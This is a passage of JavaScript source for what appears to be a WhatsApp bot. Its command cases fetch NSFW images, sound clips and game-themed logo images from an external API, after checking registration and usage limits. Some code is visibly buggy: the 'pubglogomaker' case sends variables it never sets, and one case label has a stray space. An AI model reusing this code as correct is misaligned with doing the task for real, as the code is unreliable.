if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!db.data.chats[m.chat].nsfw) return reply(lang.OffNsfw())
reply(lang.wait())
let res = await fetch(global.api('alfa', '/api/nsfw/'+command, {}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendFile(m.chat, img, 'nsfw.jpg', lang.ok(), m)
db.data.users[m.sender].limit -= 1
}
break
//sound
case 'sound71': case 'sound72': case 'sound73': case 'sound74': case 'sound75': case 'sound1': case 'sound2': case 'sound3': case 'sound4': case 'sound5': case 'sound6': case 'sound7': case 'sound8': case 'sound9': case 'sound10': case 'sound11': case 'sound12': case 'sound13': case 'sound14': case 'sound15': case 'sound16': case 'sound17': case 'sound18 ': case 'sound19': case 'sound20': case 'sound21': case 'sound22': case 'sound23': case 'sound24': case 'sound25': case 'sound26': case 'sound27': case 'sound28': case 'sound29': case 'sound30': case 'sound31': case 'sound32': case 'sound33': case 'sound34': case 'sound35': case 'sound36': case 'sound37': case 'sound38': case 'sound39': case 'sound40': case 'sound41': case 'sound42': case 'sound43': case 'sound44': case 'sound45': case 'sound46': case 'sound47': case 'sound48': case 'sound49': case 'sound50': case 'sound51': case 'sound52': case 'sound53': case 'sound54': case 'sound55': case 'sound56': case 'sound57': case 'sound58': case 'sound59': case 'sound60': case 'sound61': case 'sound62': case 'sound63': case 'sound64': case 'sound65': case 'sound66': case 'sound67': case 'sound68': case 'sound69': case 'sound70':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
reply(lang.wait())
let res = await fetch(global.api('alfa', '/api/sound/'+command, {}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendMessage(m.chat, {audio: img, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
db.data.users[m.sender].limit -= 1
}
break
case 'coverbannerlol':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.CoverBanLol(prefix, command))
	if (!text.includes('|')) return reply(lang.CoverBanLol(prefix, command))
arg = args.join(' ')
atas = arg.split('|')[0]
bawah = arg.split('|')[1]
	const style = ['jinx7','jinx-8','kassadin-5','nissfortune-5','pyke-7','riven-8','sylas-5','vayne-9','kassadin-4','qiyana-5','renataglasc','shen-5','heimerdinger-3','nunu-5','orianna-4','ziggs-4','soraka-9','soraka-10','xayah-3','zeri-2','ahri-9','akshan-2','amumu-4','annie-3','bard-3','brand-5','diana-4','draven-3','ekko-6','elise-4','ezreal-7','gwen-3','janna-6','kindred-3','leblanc-7','leona-7','lissandra-4','lux-8','lux-9','nalzahar-4','nasteryi-7','reksai-3','sett-3','sivir-6','teemo-5','tristana-6','vladimir-5','xinzhao-5','zed-7','zeri','caitlyn-6','caitlyn-7','caitlyn-8','caitlyn-9','caitlyn-10','caitlyn-11','jayce-5','kaisa-8','karma-7','thresh-6','vi-5','yasuo-8','yasuo-9','fiora-8','norgana-7','nami-5','poppy-4','syndra-5','yuumi-4','jarvaniv-6','kayn-4','kayle-5','lillia-2','norgana-6','tryndamere-3','vex','vex-2','yone-4','tristana-5','viego-2','akali-10','anivia-4','darius-5','graves-6', 'seraphine-5','shaco-2','twistedfate-4','xayah-2','zyra-5','ahri-8','ashe-6','cassiopeia-4','evelynn-6','leblanc-6','nalphite-4','warwick-5','akshan','graves-5','nissfortune-5','pyke-6','rengar-6','thresh-5','diana-3','relia-11','olaf-3','pantheon-6','pantheon-7','riven-7','vayne-8','corki-4','naokai-2','rammus-4','veigar-4','zed-6','camille-4','drmundo-3','lucian-6','nordekaiser-4','renekton-4','sejuani-5','senna-3','sylas-4','varus-5','xerath-3','damwon','galio-3','gwen','gwen-2','jax-5','jinx-6','kayle-5','sion-2','twitch-4','velkoz-4','blitzcrank-3','leona-6','lulu-3','lulu-4','lux-7','nasus-5','nunu-4','rumble-2','samira-3','aphelios-2','blitzcrank-2','caitlyn-5','garen-6','kogmaw-4','leona-5','alzahar-3','syndra-4','wukong-4','yone-3','yuumi-3','zyra-4','alistar-4','chogath-2','draven-2','fiora-7','jarvan-5','jhin-5','karma-6','nautilus-2','neeko-5','shyvana-3','viego','azir-4','diana-4','gragas-2','janna-5','kalista-3','katarina-6','ornn-2','qiyana-4','quinn-3','rell','xinzhao-4','anivia-3', 'hecarim-4','illaoi-2','jayce-4','lissandra-3','nami-4','nasus-4','nidalee-5','seraphine-4','singed-2','skarner-2','soraka-7','varus-4','vladimir-4','yorick-4','zac','riven-8','ahri-7','akali-9','evelynn-5','kaisa-7','lucian-5','seraphine','seraphine-2','seraphine-3','aatrox-6','amumu-3','lise-3','fizz-5','karma-5','zeri-2','kassadin-3','khazix-4','sivir-5','twistedfate-3','ashe-5','brand-4','leesin-5','olaf-2','sett-2','kayle-4','leblanc-5','pyke-5','samira','samira-2','viktor-2','yasuo-7','zed-5','ezreal-6','nasteryi-6','shen-4','sona-4','vi-4','yone','yone-2','ziggs-3','ahri-6','cassiopeia-3','kindred-2','riven-6','kennen-2','kogmaw-3','lillia','syndra-3','teemo-4','thresh-4','vayne-7','velkoz-3','yasuo-6','zoe-4','bard-2','gnar-3','irelia-10','nocturne-4','poppy-3','enna-2','volibear-3','volibear-4','ekko-5','fiora-6','lucian-4','pantheon-5','leblanc-4','norgana-5','urgot-4','zyra-3','jinx-5','sett','alistar-3','katarina-5','lux-5','lux-6','nasteryi-5','nalphite-3','nordekaiser-3','reksai-2','sejuani-4','tryndamere-2','xerath-2','aphelios','garen-5','jax-4','karma-4','leesin-4','leona-4','nidalee-4','rengar-5','soraka-5','soraka-6','swain-4','sylas-3','trundle-2','vladimir-3','aatrox-5','akali-8','ekko-4','qiyana-3','senna','yasuo-5','ashe-4','darius-4','hecarim-3','norgana-4','nami-3','riven-4','riven-5','ryze-3','neeko-3','eeko-4','xayahrakan','zoe-3','airi-6','noctune-3','pantheon-3','pantheon-4','rammus-3','udyr-2','veigar-3','akali-7','garen-4','irelia-8','irelia-9','jinx-4','lucian-3','pyke-4','warwick-4','caitlyn-3','caitlyn-4','kaisa-6','qiyana','qiyana-2','yasuo-4','jhin-3','karma-3','nordekaiser-2','tristana-4','nami','poppy-3','aatrox','lulu','braum','camille','karma','kindred','hecarim','norgana','renekton','kennen','akali','varus','orianna','blitzcrank','bloodmoonjhin','bloodmoontalon','arcaderiven','udyr','rumble','gnar','shaco','twitch','veigar','tryndamere','viktor','trundle','ezreal','poppy','lissandra','jax','vi','vellkoz','darius','diana','corki','sivir','ryze','azir','tristana','kled','volibear','twisterfate','anivia','zyra','quinn','nissfortune','kalista','ezrealandshen','gangplank','hextachannie','elementalistlux','xinzhao','vayne','jhin','reksai','graves','kogmaw','garen','porojinx','warwick','fizz','caitlyn','rengar','talon','nidalee','lux','jinx','thresh','wukong','sona','ahri','riven','zed','leesin','janna','katarina','leblanc','leona','fiora','lucian','shen','ziggs','yasuo','ekko','draven','ashe','ekko-5','teemo','khazix','nasteryi','brand','taliyah','nocturne','cassiopeia','xayah','rakan','syndra','irelia','leesingf','yasuobm','aurelionsol','pantheon','bard','singed','soraka','taric','naokai','xerath','gragas','jayce','riven3','nalphite','naster_yi2','chogath','zed2','darius2','talon2','kayle','drmundo','rammus','vladimir','ahri-2','karma-2','jarvan','nidalee-2','vayner-2','warwick-2','rengar-2','yasuo-3','galio','pantheon-2','jinx-2','nalzahar','olaf','shyvana','thresh-2','sion','caitlyn-2','swain','kassadin','heimerdinger','amumu','alistar','nasus','sejuani','ezreal3','nautilus','fiddlesticks','sona2','karthus','ekko2','orianna2','velkoz-2','xinzhao2','garen2','annie-2','yasuonb','rivendb','kayn','kaisa','veigar-2','vayne-3','twitch-2','tristana-2','rhaast','nalzahar-2','kayle-2','illaoi','fizz-2','elise','brand-2','syndra-2','soraka-2','nissfortune-2','hecarim-2','ezreal-2','ahri-3','yorick','z-2','tahmkench','shen-2','ornn','cassiopeia-2','renekton-2','nasus-2','jarvan-2','fiora-2','alistar-2','taric-2','zac-2','yorick-2','varus-2','nordekaiser','nasteryi-3','katarina-2','janna-2','fiora-3','evelynn','elise-2','ashe-2','annie','zoe','vi-2','vayne-4','rengar-3','jhin-2','graves-2','xayahrakan','warwick-3','nissfortune-3','lux-2','kaisa','jarvaniv','zoe-2','swain-2','sivir-2','nissfortune-4','jax-2','galio-2','varus-3','urgot','twistedfate-2','taric-3','swain-3','shen-3','rammus-2','pyke-2','pyke','nasus-3','talon','khazix-2','kayn-2','irelia-2','evelynn-2','akali-2','vladimir-2','jayce-2','janna-3','irelia-4','irelia-3','diana-2','zed-3','teemo-2','taliyah-2','shyvana-2','poppy-2','katarina-3','jax-3','garen-3','darius-3','chogath-2','aatrox-2','soraka-3','sona-3','sivir-3','kaisa-2','akali-4','akali-3','xinzhao-3','urgot-3','urgot-2','tristana-3','talon-3','sejuani-2','nunu-2','lulu-2','lucian-2','irelia-6','irelia-5','ashe-3','ziggs-2','yasuo-2','sona-4','nalphite-2','khazix-3','kayn-3','jinx-3','orianna-3','kaisa-4','kaisa-3','heimerdinger-2','ezreal-4','evelynn-3','akali-5','ahri-4','thresh-3','ryze-2','kled-2','janna-4','graves-3','fiddlesticks-2','ekko-3','amumu-2','nami-2','lulusoraka','lissandra-2','leona-3','leona-2','leblanc-2','ezrealmissfortune','camille-2','twitch-3','soraka-4','renekton-3','neeko-2','neeko','nasteryi-4','drmundo-2','akali-6','zyra-2','zilean','wukong-3','wukong-2','teemo-3','skarner','sivir-4','riven-2','quinn-2','pyke-3','nocturne-2','nidalee-3','norgana-2','leesin-3','kogmaw-2','kassadin-2','karthus-2','kalista-2','gnar-2','gangplank-2','corki-2','azir-3','azir-2','aatrox-4','aatrox-3','vi-3','vayne-6','vayne-5','tahmkench-2','sylas-2','sylas','sejuani-3','fiora-4','nunu-3','norgana-3','kayle-3','brand-3','anivia-2','ahri-5','yorick-3','rengar-4','fizz-4','fizz-3','corki-3','zed-4','rakan-2','leblanc-3','kaisa-5','jarvaniv','ivern','irelia-7','fiora-5','evelynn-4','camille-3','yuumi-2','yuumi','lux-4','lux-3','katarina-4','jayce-3','graves-4','ezreal-5']
if (!style.includes(bawah)){ 
let listt = `${lang.coverbannerlol(style.length)}`
no = 0

for (var i = 0; i < style.length; i++) {
no +=1

listt += no.toString() + '.  '  + style[i] + '\n'

}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: atas, heroes : bawah}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}
	break
case 'pubglogomaker':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.pubglogomaker(prefix, command))
	if (!text.includes('|')) return reply(lang.pubglogomaker(prefix, command))
	arg = args.join(' ')
atas = arg.split('|')[0]
bawah = arg.split('|')[1]
	const style = ['women','nen']
if (!style.includes(bawah)){ 
let listt = `${lang.pubglogomaker_(style.length)}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, style : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'colorfulpubg':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.colorfulpubg(prefix, command))
	if (!text.includes('|')) return reply(lang.colorfulpubg(prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['gold','green-blue','pink-yellow','green-yellow','cyan-purple','orange-red']
if (!style.includes(m2)){ 
let listt = `${lang.colorfulpubg_(style.length)}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, color : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}
	break
case 'astronotspace':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}??🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.astronotspace(prefix, command))
	if (!text.includes('|')) return reply(lang.astronotspace(prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['anubis','dragon','duck','gorilla','panda','panther','shark','squirrel','tiger','wolf','bull','rhino','rooster','pikachu','parrot','boar','bee','hurricane','deer','horse','crocodile','pitbull']
if (!style.includes(m2)){ 
let listt = `${lang.pubglogomaker_(style.length)}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, style : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'wallpaperaov':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.wallpaperaov(prefix, command))
	if (!text.includes('|')) return reply(lang.wallpaperaov(prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['allain','allain-2','kahlii-3','nakroth-4','preyta-2','skud-2','taara-4','valhein-4','arum-4','butterfly-6','capheny-3','elandorr-2','ilumia-3','ishar-4','lauriel-6','laville','liliana-5','nurad-8','quillen-5','rouie','rouie-2','taara-3','telannas-5','yena-4','yena-5','zata','ata','lauriel-5','qi-3','roxie-3','wukong-5','aleister-2','amily-3','arthur-3','arum-3','astrid-2','dirak','dirak-2','grakk-5','hayate-4','ishar-2','ishar-3','jinna-2','keera','keera-3','lauriel-4','nax','natalya-5','quillen-4','raz-3','richter-2','ryoma-4','telannas-4','ulen-6','valhein-3','violet-7','yorn-4','zill-3','ignis-2','lubu-2','naloch-2','sephera-3','butterfly-5','diaochan-4','elandoor','krizzix-2','nina-2','natalya-3','veera-3','violet-6','yena-2','yena-3','krizziz','nurad-7','volkath','volkath-2','airi-4','arduin-3','enzo-3','hayate-3','krixi-3','nurad-6','quillen-3','telannas-3', 'wisp-2','zip-2','gildur-2','ishar','tulen-5','amily-2','annette-3','arthur-2','butterfly-4','errol-2','joker','kahlii-2','kilgroth','lauriel-3','nurad-5','arduin-2','darcy-2','florentino-3','noren','quillen-2','ryoma-5','sephera-3','violet-5','airi-3','diaochan-3','diaochanlubu','elsuroxie','lindis-3','taara-2','toro-2','tulen-4','violet-4','wonderwoman','ybneth','zill-2','arum-2','florentino-2','liliana-4','nurad-4','yorn-3','zip','annette-2','qi','qi-2','celica','capheny-2','diaochan-2','elsu-2','ilumia-2','krixi-2','narja-2','nurad-3','preyta','telannas-2','valhein','veera-2','veres-2','yorn-2','zephys-2','airi-2','annette','baldum','butterfly-3','elsu-2','errol','fennik','lauriel-2','liliana-2','liliana-3','lindis-2','nurad-2','nakroth-2','nakroth-3','natalya-2','raz-2','ryoma-2','slimz','teemee','tulen-2','tulen-3','violet-3','wiro','wukong-3','wukong-4','zill','aleister','alice','arduin','arthur','azzenka','batman','butterfly-2','cresh','darcy', 'diaochan','enzo-2','hayate-2','jinna','lubu','nganga','violet-2','wukong-2','zanis-2','florentino','gildur','ignis','naloch','narja','nakroth','omen','payna','raz','rourke','roxie','ryoma','skud','taara','toro','valhein','veres','violet','wisp','wukong','wonderwoman','xeniel','yorn','zanis','elsu','flash','hayate','ilumia','kahlii','krixi','lauriel','liliana','lindis','nina','nurad','natalya','quillen','richter','sephera','superman','telannas','thane','airi','amily','arum','astrid','butterfly','capheny','enzo','tulen','veera','yena','ryoma-4','zephys','zuka']
if (!style.includes(m2)){ 
let listt = `${lang.coverbannerlol(style.length)}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, heroes : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'maketeamlogo':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('style', 'anubis', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('style', 'anubis', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['anubis','cowgirl','dragon','duck','ghost','gorilla','panda','panther','shark','squirrel','tiger','wolf','bee','crocodile','deer','pitbull','horse','hurricane','indian','assassin','boar','rapid','raven','warrior','pikachu','pubg','ninja','drift','yasuo','rhino','phoenix','bull','hornet','eagle','hunter','parrot','rooster','lion','skull','wolver','wolf','cobra','dragon','panther','owl','tiger','reaper','warrior']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Style')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, style : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'circlemarcotteam':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('logo', 'lionsnake', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('logo', 'lionsnake', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['panther','rhino','squirrel','unicorn','zebra','lionsnake','bear','bull','dragon','eagle','fox','griffin','hawk','lion','peacock','phoenix','tiger','wolver']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Logo')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, logo : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'wallpaperml':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('heroes', 'aldous', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('heroes', 'aldous', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['aldous','alice-2','angela-2','argus-2','chou','chou-2','estes','eudora','eudora-2','granger','granger-2','gusion-3','hanabi-2','hanzo','helcurt','layla-3','lesley-4','lunox-2','odette-3','saber','thamuz','vexana','argus','dyrroth','esmeralda-2','kadita-2','lancelot','leomord-2','lylia','vale','valir','xborg','zhask','alice','alpha','athena','badang','balmond','bane','diggie','trunks','fanny-2','fanny-3','freya','guinevere','gusion','gusion-2','hanabi','harith','harith-2','hayabusa-2','kadita','kagura-2','kagura-3','karina-2','kimmy','layla-2','leomord','lesley-2','lesley-3','lunox','nartis','niya-2','nana','nana-2','natalia','natalia-2','odette-2','pharsa','rafaela-2','selena-2','zilong','alucard','angela','bruno','change','claude','fanny','hayabusa','hilda','hylos','kagura','karina','karrie', 'layla','lesley','lolita','ninotaur','ninsittar','niya','noskov','odette','rafaela','selena']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Heroes')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, heroes : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}
	break
case 'dragonballfb':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('character', 'aldous', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('character', 'aldous', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
	const style = ['cabba','caulifla','cooler','cumber','hit','kale','kaminoren','gokuui','xenogokuss3','xenogokuss4','xenovegeta','xenovegito','android-18','blackgoku','bulma','frieza','gotenks-2','kaio','krillinandroid-18','launch','nutenroshi-2','oldkai','oolong','pilaf','tienshinhan','trunks-3','bardock','gotenks','nutenroshi','piccolo','songoku-2','songoku-3','songoten','trunks-2','vegeta-2','vegito','krillin','najinbuu','songohan','songoku','trunks','vegeta']
if (!style.includes(m2)){ 
let listt = `${lang.maketeamlogo_(style.length, 'Character')}`
no = 0
for (var i = 0; i < style.length; i++) {
no +=1
listt += no.toString() + '.  '  + style[i] + '\n'
}
reply(listt)
} else {
	reply(lang.wait())
let textpro2 = await fetch(api('alfa', '/api/ephoto360/'+command, {text: m1, character : m2}, 'apikey'))
if (!textpro2.ok) return await textpro2.text()
let img = await textpro2.buffer()
alpha.sendFile(m.chat, img, 'ephoto360.jpg', lang.ok(), m)
}
db.data.users[m.sender].limit -= 1
}

	break
case 'bannerofaov':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
	if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
	if (!text) return reply(lang.maketeamlogo('character', 'aphelios', prefix, command))
	if (!text.includes('|')) return reply(lang.maketeamlogo('character', 'aphelios', prefix, command))
var mon = args.join(' ')
var m1 = mon.split("|")[0]
var m2 = mon.split("|")[1]
